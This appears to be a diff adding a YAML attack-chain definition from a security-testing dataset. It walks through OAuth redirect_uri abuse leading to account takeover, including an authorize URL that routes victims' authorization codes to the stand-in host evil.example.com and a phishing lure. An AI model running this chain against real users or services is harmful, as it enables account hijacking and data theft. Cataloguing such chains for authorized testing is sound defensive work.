@@ -1,0 +1,90 @@
+# bugwolf-chain-h100-v1
+## Source: H1 #115669 (Facebook OAuth), Shopify #791775 (email confirm bypass)
+## License: bugwolf-MIT
+# Port: 2026-09-05
+# Severity: critical
+# Bounty band: $5K – $30K
+schema: bugwolf-chain-h100-v1
+id: 01_oauth_to_ato
+title: "OAuth → Account Takeover (cross-tenant)"
+bounty: "$25K H100"
+prerequisites:
+  - id: oauth_wildcard_redirect
+    description: "OAuth provider accepts a wildcard or prefix-matching redirect_uri"
+  - id: subdomain_register_or_open_redirect
+    description: "Attacker can land a page on a host the provider considers trusted"
+  - id: victim_link_delivery
+    description: "Vector to deliver the crafted authorize URL (XSS, phishing, CSRF)"
+steps:
+  - order: 1
+    description: "Probe the OAuth provider for wildcard or suffix-only redirect_uri matching"
+    protocol: http
+    technique: oauth_redirect_uri_fuzz
+    preconditions:
+      - "scope_approval"
+      - "test_account_for_provider"
+    evidence:
+      kind: request
+      method: GET
+      url: "/oauth/authorize?redirect_uri=https://*.example.com/callback"
+      response_codes: [200, 302]
+    destructive: false
+  - order: 2
+    description: "Register an attacker-controlled host that matches the wildcard pattern"
+    protocol: http
+    technique: subdomain_register
+    preconditions:
+      - "attacker_domain"
+    evidence:
+      kind: dns
+      record: A
+      host: "evil.example.com"
+    destructive: false
+  - order: 3
+    description: "Craft the authorize URL pointing to the attacker host as redirect_uri"
+    protocol: http
+    technique: authorize_url_craft
+    evidence:
+      kind: request
+      method: GET
+      url: "/oauth/authorize?client_id=victim_app&redirect_uri=https://evil.example.com/cb&response_type=code&scope=openid%20profile"
+    destructive: false
+  - order: 4
+    description: "Deliver the crafted URL to the victim (phishing page or XSS payload)"
+    protocol: http
+    technique: link_delivery
+    preconditions:
+      - "victim_session_active"
+    evidence:
+      kind: page
+      body: "Click here to verify your account"
+    destructive: false
+  - order: 5
+    description: "Capture the authorization code at the attacker endpoint"
+    protocol: http
+    technique: auth_code_capture
+    evidence:
+      kind: server_log
+      fields: [code, state, redirect_uri]
+    destructive: false
+  - order: 6
+    description: "Exchange the captured code for an access token + refresh token"
+    protocol: iam
+    technique: code_to_token_exchange
+    evidence:
+      kind: token
+      audience: "victim_app"
+    destructive: false
+  - order: 7
+    description: "Impersonate the victim across all client_id-bound scopes"
+    protocol: iam
+    technique: cross_tenant_impersonation
+    evidence:
+      kind: action
+      description: "Read victim profile + write victim data"
+    destructive: false
+final_severity: critical
+references:
+  - "HackerOne #115669 — Facebook OAuth redirect_uri bypass ($15,000)"
+  - "Shopify #791775 — Email confirmation bypass → SSO takeover (1,913 upvotes)"
+  - "PortSwigger Web Security Academy: OAuth grant flow attacks"
